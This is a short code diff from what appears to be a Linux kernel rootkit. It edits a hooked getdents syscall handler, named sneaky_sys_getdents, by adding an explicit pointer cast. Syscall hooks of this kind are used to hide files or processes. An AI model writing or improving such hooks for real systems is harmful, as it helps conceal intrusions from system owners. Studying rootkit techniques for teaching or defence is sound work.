@@ -58,7 +58,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
 asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
     struct linux_dirent *d;
     int nread = original_getdents(regs);
-    struct linux_dirent *dirp = regs->si;
+    struct linux_dirent * dirp = (struct linux_dirent *)regs->si;
 
     if (nread == -1) {
         return -1;
